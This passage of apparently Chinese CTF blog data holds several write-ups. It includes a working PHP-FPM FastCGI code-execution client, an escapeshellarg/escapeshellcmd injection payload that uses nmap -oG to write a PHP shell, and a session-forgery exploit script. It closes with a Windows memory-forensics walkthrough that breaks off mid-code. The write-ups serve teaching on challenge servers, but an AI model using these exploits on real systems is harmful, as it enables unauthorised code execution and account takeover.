__repr__(self): return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;) parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;) parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;) parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;) parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = &quot;/&quot; uri = args.file content = args.code params = &#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;), &#x27;SCRIPT_NAME&#x27;: uri, &#x27;QUERY_STRING&#x27;: &#x27;&#x27;, &#x27;REQUEST_URI&#x27;: uri, &#x27;DOCUMENT_ROOT&#x27;: documentRoot, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;, &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content), &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27; &#125; response = client.request(params, content) print(force_text(response)) 我们利用这个进行RCE。问题是我们需要知道一个目标服务器上PHP文件的绝对路径。在扫80端口的时候我们发现他有一个redirect.php。大胆猜测一下Web1和Web2的路径是一样的，都在/www下，试一下。 看到Flag了，但是我们没有权限拿到。怎么办？我们似乎还有一个873 Rsync没有利用。参考这个。看一下rsync的配置。Ubuntu默认将rsync的配置保存在/etc/rsyncd.conf中。src节中将路径设置在根下，满足条件。我们用rsync拖下来flag。 然后cat /tmp/7h1s_i5_f14g就可以拿到flag了。 flag{f85231ab-fe4c-46b7-801c-a9eb844b43e2}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Shell","slug":"Shell","permalink":"http://tiaonmmn.github.io/tags/Shell/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"http://tiaonmmn.github.io/tags/PHP-FPM/"},{"name":"RSync","slug":"RSync","permalink":"http://tiaonmmn.github.io/tags/RSync/"}]},{"title":"BUUOJ刷题-Web-Online-Tool","slug":"BUUOJ刷题-Web-Online-Tool","date":"2019-09-08T10:27:18.000Z","updated":"2019-12-10T12:15:12.601Z","comments":true,"path":"2019/09/08/BUUOJ刷题-Web-Online-Tool/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/08/BUUOJ%E5%88%B7%E9%A2%98-Web-Online-Tool/","excerpt":"BUUCTF 2018的Online Tool。给了源码：","text":"BUUCTF 2018的Online Tool。给了源码： 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; 看到system就想到命令注入了，下面仔细看一下传入的参数。$host经GET传入，然后过escapeshellarg和escapeshellcmd处理，最后传入nmap。escapeshellarg和escapeshellcmd用来转义命令行和参数。他们俩单独使用没什么问题，但是如果同时使用就产生问题了。就本题而言，简单来说我们传入的数据（以' &lt;?php phpinfo();?&gt; -oG test/mmm.txt为例）会变成这样： 先进行escapeshellarg编码，会将'转义，变成：''\\'' &lt;?php phpinfo();?&gt; -oG test/mmm.txt'。我们输入的单引号使用\\转义，此时单引号被当成普通字符处理，需要被''包裹，而返回结果的第一个与最后一个单引号字符是escapeshellarg添加的。 进行escapeshellcmd编码，返回''\\\\'' \\&lt;\\?php phpinfo\\(\\)\\;\\?\\&gt; -oG test/mmm.txt\\'。escapeshellcmd会在*&#;`|\\*?~^()[]{}$\\*, *\\x0A* 和 *\\xFF*字符前加一个\\，因此第一部中插入的\\自身被转义，原本被转移的单引号开始有意义，而''\\\\''这组单引号已经配对，第一步escapeshellarg造成的限制已经解除。后买你的内容我们完全可控。而最后的单引号则会因为单引号不配对被转义，对我们的命令不造成任何影响。 那么我们就逃逸出来了。但是现在的问题是我们没法打断原本的nmap命令行，常见的|，;都会被escapeshellcmd转义掉。那我们只能想办法通过nmap命令参数进行些事情了。 nmap的输出选项中有一个很有意思：-oG，这个格式会将nmap的输出完整输出到一个文件中，不转义。如果使用默认的-oN，会转义。那么 好了，我们的Payload很明确了，写一个Shell到文件中。' &lt;?php phpinfo();?&gt; -oG test.php'。然后访问相关目录的test.php就会得到phpinfo信息了。然后写个shell，或者读文件什么的随你了。 flag{1c23e720-d581-403a-8fc1-70a0f633c485}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"escapeshellarg","slug":"escapeshellarg","permalink":"http://tiaonmmn.github.io/tags/escapeshellarg/"},{"name":"escapeshellcmd","slug":"escapeshellcmd","permalink":"http://tiaonmmn.github.io/tags/escapeshellcmd/"},{"name":"命令注入","slug":"命令注入","permalink":"http://tiaonmmn.github.io/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"}]},{"title":"BUUOJ刷题-Web-Easy Notes","slug":"BUUOJ刷题-Web-Easy-Notes","date":"2019-09-07T03:29:20.000Z","updated":"2020-03-02T11:40:50.846Z","comments":true,"path":"2019/09/07/BUUOJ刷题-Web-Easy-Notes/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/07/BUUOJ%E5%88%B7%E9%A2%98-Web-Easy-Notes/","excerpt":"HarekazeCTF 2019的Easy Notes。","text":"HarekazeCTF 2019的Easy Notes。 先把源码脱下来。index.php没有LFI。pages/flag.php要求is_admin()成功后显示flag。is_admin()在lib.php中： 123456function is_admin() &#123; if (!isset($_SESSION[&#x27;admin&#x27;])) &#123; return false; &#125; return $_SESSION[&#x27;admin&#x27;] === true;&#125; 要求SESSION验证，那我们来看一下SESSION处理的相关代码。init.php中出现session_save_path为\"/var/www/tmp/\"。然后全部代码再没有提过$_SESSION['admin']了，同时也没有数据库的参与。那就要考虑一下Session反序列化的问题了。 接着看代码，在用户登录以后可以添加Notes，以及Export。添加Notes，会把相关数据写到Session里。Export的时候可以选择Tar或者Zip，如果指定为Tar会使用Phar进行压缩，否则就会使用Zip。注意type是可以通过GET传递的，那么如果type设为.，就会连同前面的.一起被删除。那么文件就变成了sess_-(随机数字)，保存在/var/www/tmp下。 PHP使用文件存储Session信息，并且。因此如果我们把Session文件替换了，写入admin信息，那么Flag就会出来了。PHP的Session文件以\"sess_\"开头，后接Session ID，Session ID仅有[A-Za-z0-9-0]构成。Ubuntu默认安装的PHP中session.serialize_handler默认设置为php。这种情况下，Session文件的内容为(属性名)|(序列化数据)。在访问Session数据的时候，PHP会自动反序列化相应数据。那么，我们构造Note的标题名为\"|N;admin|b:1;\"。这样反序列化的结果就是admin==bool(true)。我们就伪造了admin身份。而我们访问的时候，通过传递Cookie的值PHPSESSID为我们想要的Session ID，PHP就会去反序列化相应的Session文件。 那么，攻击流程如下： 1. 注册一个用户，名为&quot;sess\\_&quot; 2. 添加一个Note，标题为&quot;|N;admin|b:1;&quot;，内容任意 3. 访问&quot;export.php?type=.&quot;，将我们想要的反序列化数据写入Session文件，返回的页面中会出现文件名 4. 带上刚才的PHPSESSID Cookie访问/?page=flag获取flag。 脚本如下： 123456789101112131415161718192021222324252627282930 import re import requests URL = &#x27;http://(target)/&#x27;while True: # login as sess_ sess = requests.Session() sess.post(URL + &#x27;login.php&#x27;, data=&#123; &#x27;user&#x27;: &#x27;sess_&#x27; &#125;) # make a crafted note sess.post(URL + &#x27;add.php&#x27;, data=&#123; &#x27;title&#x27;: &#x27;|N;admin|b:1;&#x27;, &#x27;body&#x27;: &#x27;hello&#x27; &#125;) # make a fake session r = sess.get(URL + &#x27;export.php?type=.&#x27;).headers[&#x27;Content-Disposition&#x27;] sessid = re.findall(r&#x27;sess_([0-9a-z-]+)&#x27;, r)[0] # get the flag r = requests.get(URL + &#x27;?page=flag&#x27;, cookies=&#123; &#x27;PHPSESSID&#x27;: sessid &#125;).content.decode(&#x27;utf-8&#x27;) flag = re.findall(r&#x27;flag\\&#123;.+\\&#125;&#x27;, r) if len(flag) &gt; 0: print(flag[0]) break flag{d1bdac0f-d30d-4998-a79d-f9b7d4bac14f}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Session","slug":"Session","permalink":"http://tiaonmmn.github.io/tags/Session/"}]},{"title":"Chaos-Communication-Camp-2019-FlagConverter","slug":"Chaos-Communication-Camp-2019-FlagConverter","date":"2019-09-05T13:09:52.000Z","updated":"2019-12-10T12:15:12.606Z","comments":true,"path":"2019/09/05/Chaos-Communication-Camp-2019-FlagConverter/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/05/Chaos-Communication-Camp-2019-FlagConverter/","excerpt":"Chaos Communication Camp 2019的FlagConverter，这题一共三个flag。题目描述： On the campground of the CCCamp, someone is trying to troll us by encrypting our flags. Sadly, we only got the memory dump of the PC which encrypted our flags.","text":"Chaos Communication Camp 2019的FlagConverter，这题一共三个flag。题目描述： On the campground of the CCCamp, someone is trying to troll us by encrypting our flags. Sadly, we only got the memory dump of the PC which encrypted our flags. 附件在这里。 给了个dmp文件，应该是Windows的内存Dump。先说一下，这题的flag开头为ALLES。那我们先搜一下字符串好了。strings dmp.dmp|grep -i \"ALLES{\"会找到一个flag：ALLES{f0r3n51k_15_50m3t1m35_t00_345y}。 下一步是分析内存了。内存Dump必用Volatility。先分析一下dmp是那种操作系统的。 1234567891011121314151617volatility imageinfo -f flagconverter.dmp Volatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS) AS Layer3 : FileAddressSpace (&#x2F;root&#x2F;flagconverter.dmp) PAE type : No PAE DTB : 0x187000L KDBG : 0xf800027ff120L Number of Processors : 2 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80002801000L KPCR for CPU 1 : 0xfffff880009eb000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2019-08-21 05:55:09 UTC+0000 Image local date and time : 2019-08-21 07:55:09 +0200 Windows 7 SP1 x64的系统。那我们来列一下进程。 123456789101112131415161718192021222324252627282930313233343536373839volatility pslist -f flagconverter.dmp --profile&#x3D;Win7SP1x64Volatility Foundation Volatility Framework 2.6Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------0xfffffa8000ca0040 System 4 0 86 377 ------ 0 2019-08-21 05:52:02 UTC+0000 0xfffffa8002861330 smss.exe 280 4 2 30 ------ 0 2019-08-21 05:52:02 UTC+0000 0xfffffa80027dd700 csrss.exe 364 340 9 355 0 0 2019-08-21 05:52:05 UTC+0000 0xfffffa8007e4f8e0 wininit.exe 404 340 3 76 0 0 2019-08-21 05:52:05 UTC+0000 0xfffffa8007eaeb00 csrss.exe 424 412 8 188 1 0 2019-08-21 05:52:05 UTC+0000 0xfffffa8001d1e060 winlogon.exe 468 412 4 115 1 0 2019-08-21 05:52:05 UTC+0000 0xfffffa8001d6f820 services.exe 504 404 10 188 0 0 2019-08-21 05:52:05 UTC+0000 0xfffffa8001d75b00 lsass.exe 520 404 7 484 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001d74710 lsm.exe 528 404 10 147 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001dbeb00 svchost.exe 640 504 11 354 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001c73060 VBoxService.ex 704 504 14 125 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001f2fb00 svchost.exe 764 504 7 240 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001f71b00 svchost.exe 852 504 21 425 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001f77b00 svchost.exe 908 504 21 435 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001fa2060 svchost.exe 936 504 13 248 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001fc2060 svchost.exe 988 504 34 888 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8001ff9b00 audiodg.exe 304 852 4 114 0 0 2019-08-21 05:52:06 UTC+0000 0xfffffa8002094200 svchost.exe 1068 504 15 350 0 0 2019-08-21 05:52:07 UTC+0000 0xfffffa80020ddb00 spoolsv.exe 1208 504 14 292 0 0 2019-08-21 05:52:07 UTC+0000 0xfffffa80020fd7d0 svchost.exe 1252 504 19 300 0 0 2019-08-21 05:52:07 UTC+0000 0xfffffa80021a0240 svchost.exe 1352 504 12 150 0 0 2019-08-21 05:52:07 UTC+0000 0xfffffa8000d48610 taskhost.exe 1828 504 9 172 1 0 2019-08-21 05:52:10 UTC+0000 0xfffffa80022dfb00 dwm.exe 1900 908 4 76 1 0 2019-08-21 05:52:10 UTC+0000 0xfffffa800230d910 explorer.exe 1924 1884 24 788 1 0 2019-08-21 05:52:10 UTC+0000 0xfffffa80023a7640 VBoxTray.exe 960 1924 13 141 1 0 2019-08-21 05:52:11 UTC+0000 0xfffffa80020c1060 SearchIndexer. 1816 504 13 647 0 0 2019-08-21 05:52:18 UTC+0000 0xfffffa80024133a0 SearchProtocol 1164 1816 6 272 0 0 2019-08-21 05:52:18 UTC+0000 0xfffffa8002428710 SearchFilterHo 844 1816 4 95 0 0 2019-08-21 05:52:18 UTC+0000 0xfffffa800246e530 converter.exe 2308 2280 11 183 1 0 2019-08-21 05:52:25 UTC+0000 0xfffffa800246fb00 converter.exe 2316 2280 10 152 1 0 2019-08-21 05:52:25 UTC+0000 0xfffffa8000e06b00 sppsvc.exe 2732 504 6 152 0 0 2019-08-21 05:54:09 UTC+0000 0xfffffa8000e0b060 svchost.exe 2760 504 12 376 0 0 2019-08-21 05:54:09 UTC+0000 0xfffffa8002443390 WmiPrvSE.exe 2976 640 8 142 0 0 2019-08-21 05:54:56 UTC+0000 converter.exe似乎很扎眼。我们用procdump提出来。2308提出来大概8MB，而2316只有8KB。他俩似乎都是.Net的程序。而2308是可以直接运行的。我们用dotPeek反编译一下。2308的代码太大了，我们暂时不考虑。而2316.exe中有一段代码我们很感兴趣。 1234567891011121314151617181920212223242526272829303132333435363738using someCrypto;using System;using System.ComponentModel;using System.Drawing;using System.IO;using System.Text;using System.Windows.Forms;namespace converter&#123; public class Form1 : Form &#123; public string string_0 = &quot;&quot;; public MemoryStream ms = new MemoryStream(800); private IContainer components; private Button button; private RichTextBox text; public Form1() &#123; this.InitializeComponent(); &#125; private void Click_Button(object sender, EventArgs e) &#123; Crypto crypto = new Crypto(); crypto.function03(); this.string_0 = Convert.ToBase64String(crypto.function02(this.text.Text)); crypto.Dispose(); GC.Collect(); GC.WaitForPendingFinalizers(); this.ms.Read(Encoding.ASCII.GetBytes(this.string_0), 0, Encoding.ASCII.GetBytes(this.string_0).Length); this.text.Text = this.string_0; &#125; &#125;&#125; 其中用到了someCrypto？那我们用dlllist查一下2316用到的DLL。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950volatility dlllist -f flagconverter.dmp --profile&#x3D;Win7SP1x64 -p 2316Volatility Foundation Volatility Framework 2.6************************************************************************converter.exe pid: 2316Command line : C:\\Users\\ALLES\\Desktop\\3\\converter.exe Service Pack 1Base Size LoadCount LoadTime Path------------------ ------------------ ------------------ ------------------------------ ----0x0000000001090000 0x8000 0xffff 1970-01-01 00:00:00 UTC+0000 C:\\Users\\ALLES\\Desktop\\3\\converter.exe0x0000000077aa0000 0x19f000 0xffff 1970-01-01 00:00:00 UTC+0000 C:\\Windows\\SYSTEM32\\ntdll.dll0x000007fef5020000 0x6f000 0xffff 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\SYSTEM32\\MSCOREE.DLL0x0000000077980000 0x11f000 0xffff 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\KERNEL32.dll0x000007fefd770000 0x6a000 0xffff 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\KERNELBASE.dll0x000007feff5a0000 0xdb000 0xe 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\ADVAPI32.dll0x000007feff680000 0x9f000 0x68 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\msvcrt.dll0x000007feff4e0000 0x1f000 0x3b 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\SYSTEM32\\sechost.dll0x000007feffb90000 0x12d000 0x2b 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\RPCRT4.dll0x000007fef4f80000 0x9c000 0x1 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoreei.dll0x000007fefd9b0000 0x71000 0x9 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\SHLWAPI.dll0x000007feff720000 0x67000 0x83 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\GDI32.dll0x0000000077880000 0xfa000 0x87 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\USER32.dll0x000007feff170000 0xe000 0x1f 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\LPK.dll0x000007feffcc0000 0xcb000 0x1f 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\USP10.dll0x000007feff140000 0x2e000 0x3 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\IMM32.DLL0x000007feff030000 0x109000 0x3 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\MSCTF.dll0x000007fefc830000 0xc000 0x2 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\VERSION.dll0x000007fef33f0000 0x9a0000 0x3 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorwks.dll0x0000000074f00000 0xc9000 0x4 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\WinSxS\\amd64_microsoft.vc80.crt_1fc8b3b9a1e18e3b_8.0.50727.4940_none_88df89932faf0bf6\\MSVCR80.dll0x000007fefdbb0000 0xd8a000 0x2 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\shell32.dll0x000007feff790000 0x1ff000 0x9 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\ole32.dll0x000007fefd5f0000 0xf000 0x1 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\system32\\profapi.dll0x000007fef2440000 0xee3000 0x1 2019-08-21 05:52:25 UTC+0000 C:\\Windows\\assembly\\NativeImages_v2.0.50727_64\\mscorlib\\a83e2c5a3237fc549e8ccb54585ff2c1\\mscorlib.ni.dll0x000007fefd3f0000 0xf000 0x2 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\system32\\CRYPTBASE.dll0x000007fefbdb0000 0x56000 0x4 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\system32\\uxtheme.dll0x000007fef17c0000 0x183000 0x1 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorjit.dll0x000007fef0d80000 0xa33000 0x1 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\assembly\\NativeImages_v2.0.50727_64\\System\\9bb115aedc44c70bb3f6cf4ac4f3f9cb\\System.ni.dll0x000007fef0b40000 0x239000 0x1 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\assembly\\NativeImages_v2.0.50727_64\\System.Drawing\\24637f09c78822f6e1b3b531489f223f\\System.Drawing.ni.dll0x000007feefaa0000 0x1098000 0x1 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\assembly\\NativeImages_v2.0.50727_64\\System.Windows.Forms\\6c3df040b081b732b934702fa8149535\\System.Windows.Forms.ni.dll0x000007feec5b0000 0x9e000 0x1 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\system32\\RichEd20.DLL0x000007fefbb90000 0x218000 0x2 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\WinSxS\\amd64_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.7601.24280_none_145e10148b8de48e\\gdiplus.dll0x000007fefb890000 0x18000 0x1 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\system32\\dwmapi.dll0x000007fefc130000 0x1f4000 0x3 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.18837_none_fa3b1e3d17594757\\comctl32.DLL0x000007fefdad0000 0xda000 0x1 2019-08-21 05:52:26 UTC+0000 C:\\Windows\\system32\\OLEAUT32.DLL0x000007fefcde0000 0x18000 0x1 2019-08-21 05:54:38 UTC+0000 C:\\Windows\\system32\\CRYPTSP.dll0x000007fefcae0000 0x47000 0x1 2019-08-21 05:54:38 UTC+0000 C:\\Windows\\system32\\rsaenh.dll0x000007fefd540000 0x14000 0x1 2019-08-21 05:54:38 UTC+0000 C:\\Windows\\system32\\RpcRtRemote.dll0x0000000074ef0000 0x8000 0x1 2019-08-21 05:54:38 UTC+0000 C:\\Users\\ALLES\\Desktop\\3\\Crypto.dll0x000007fefcf30000 0x22000 0x1 2019-08-21 05:54:38 UTC+0000 C:\\Windows\\system32\\bcrypt.dll 其中确实有一个Crypto.dll。我们用dlldump导出来后发现还是个.Net的应用程序集。继续拖到dotPeek。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071using Microsoft.Win32.SafeHandles;using System;using System.IO;using System.Runtime.InteropServices;using System.Security.Cryptography;using System.Security.Principal;using System.Text;namespace someCrypto&#123; public class Crypto &#123; private SafeHandle handle = (SafeHandle) new SafeFileHandle(IntPtr.Zero, true); private byte[] byte_0; private byte[] byte_1; private bool disposed; public void Dispose() &#123; this.Dispose(true); GC.SuppressFinalize((object) this); &#125; protected virtual void Dispose(bool disposing) &#123; if (this.disposed) return; if (disposing) this.handle.Dispose(); this.disposed = true; &#125; private SymmetricAlgorithm function01() &#123; RijndaelManaged rijndaelManaged = new RijndaelManaged(); rijndaelManaged.KeySize = 256; rijndaelManaged.IV = this.byte_1; rijndaelManaged.Key = this.byte_0; return (SymmetricAlgorithm) rijndaelManaged; &#125; public byte[] function02(string string_0) &#123; SymmetricAlgorithm symmetricAlgorithm = this.function01(); MemoryStream memoryStream = new MemoryStream(); CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, symmetricAlgorithm.CreateEncryptor(), CryptoStreamMode.Write); byte[] bytes = new UnicodeEncoding().GetBytes(string_0.PadRight(string_0.Length % 8, char.MinValue)); cryptoStream.Write(bytes, 0, bytes.Length); cryptoStream.FlushFinalBlock(); memoryStream.Position = 0L; byte[] array = memoryStream.ToArray(); string_0 = (string) null; cryptoStream.Close(); memoryStream.Close(); GC.Collect(); GC.WaitForPendingFinalizers(); return array; &#125; public void function03() &#123; byte[] binaryForm = new byte[28]; WindowsIdentity.GetCurrent().User.GetBinaryForm(binaryForm, 0); this.byte_1 = new byte[16]; Array.Copy((Array) binaryForm, 0, (Array) this.byte_1, 0, 16); this.byte_0 = new byte[32]; Array.Copy((Array) binaryForm, binaryForm.Length - 16, (Array) this.byte_0, 0, 16); Array.Copy((Array) binaryForm, binaryForm.Length - 16, (Array) this.byte_0, 16, 16); &#125; &#125;&#125; 好了，加密函数有了。那么我们要找到的密文呢？注意到2316主程序使用了Base64进行加密。那我们应该去寻找Base64字符串。后来我们在clipboard那里翻出来一段Base64，但很不幸的，这个是Flag1的Base64。然后我们大胆猜测一下2308和2316的内存中应该还残留数据，这次我们用memdump命令。导出来后grep \"=\"，果然发现一串：ZuwJUgfmKzIMbo4F8agPy1MPLq+r7cAlDLowY+RT2wgp1uifc2TXeNH4bvbb2VqfK6r77SPHFrrMYR+GMGv8JGS87Tiybyi4LNNHQWnTR8LlGlSeHWWA9pydAXuJjSk8FzUFbqHOKqHc+bCtJ/4K2Q==，那我们来看一下Crypto.dll的代码逆向推这段密文吧。 function03()主要是获取到了当前登录用户的SID，转成二进制形式，然后填充了两个数组。而function02()使用AES进行加密，将两个数组分别用做IV和Key。 加密算法已知，下一步是获得用户的SID。这个可以通过Volatility的getsids完成。converter.exe (2316): S-1-5-21-2947568794-2193893069-2968809547-1000 (ALLES)。下面是写程序解密了。首先拿到AES的Key和IV，以及要知道默认的加密方式。这个就直接用C#好了，省得再转。 12345678910111213141516171819202122232425262728using System;using System.Collections.Generic;using System.Linq;using System.Security.Principal;using System.Text;using System.Threading.Tasks;namespace ConsoleApp1&#123; class Program &#123; static byte[] byte_1; static byte[] byte_0; static void Main(string[] args) &#123; byte[] binaryForm = new byte[28]; SecurityIdentifier a=new SecurityIdentifier(&quot;S-1-5-21-2947568794-2193893069-2968809547-1000&quot;); a.GetBinaryForm(binaryForm, 0); byte_1 = new byte[16]; Array.Copy((Array)binaryForm, 0, (Array)byte_1, 0, 16); byte_0 = new byte[32]; Array.Copy((Array)binaryForm, binaryForm.Length - 16, (Array)byte_0, 0, 16); Array.Copy((Array)binaryForm, binaryForm.Length - 16, (Array)byte_0, 16, 16); Console.WriteLine(Convert.ToBase64String(byte_0)); Console.WriteLine(Convert.ToBase64String(byte_1)); &#125; &#125;&#125; 得到byte_0的Base64：mlSwr80mxIJLcPSw6AMAAJpUsK/NJsSCS3D0sOgDAAA=，byte_1的Base64：AQUAAAAAAAUVAAAAmlSwrw==。同时拿到AES的加密方式为CBC。下面就是解密了。完整程序如下（AES解密是从这里抄的）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768using System;using System.Collections.Generic;using System.IO;using System.Linq;using System.Security.Cryptography;using System.Security.Principal;using System.Text;using System.Threading.Tasks;namespace ConsoleApp1&#123; class Program &#123; static byte[] byte_1; static byte[] byte_0; static void Main(string[] args) &#123; byte[] binaryForm = new byte[28]; SecurityIdentifier a=new SecurityIdentifier(&quot;S-1-5-21-2947568794-2193893069-2968809547-1000&quot;); a.GetBinaryForm(binaryForm, 0); byte_1 = new byte[16]; Array.Copy((Array)binaryForm, 0, (Array)byte_1, 0, 16); byte_0 = new byte[32]; Array.Copy((Array)binaryForm, binaryForm.Length - 16, (Array)byte_0, 0, 16); Array.Copy((Array)binaryForm, binaryForm.Length - 16, (Array)byte_0, 16, 16); Console.WriteLine(Convert.ToBase64String(byte_0)); Console.WriteLine(Convert.ToBase64String(byte_1)); RijndaelManaged rijndaelManaged = new RijndaelManaged(); rijndaelManaged.KeySize = 256; Console.WriteLine(rijndaelManaged.Mode); Console.WriteLine(DecryptStringFromBytes(Convert.FromBase64String(&quot;ZuwJUgfmKzIMbo4F8agPy1MPLq+r7cAlDLowY+RT2wgp1uifc2TXeNH4bvbb2VqfK6r77SPHFrrMYR+GMGv8JGS87Tiybyi4LNNHQWnTR8LlGlSeHWWA9pydAXuJjSk8FzUFbqHOKqHc+bCtJ/4K2Q==&quot;))); &#125; static string DecryptStringFromBytes(byte[] cipherText) &#123; // Declare the string used to hold // the decrypted text. string plaintext = null; // Create an RijndaelManaged object // with the specified key and IV. using (RijndaelManaged rijAlg = new 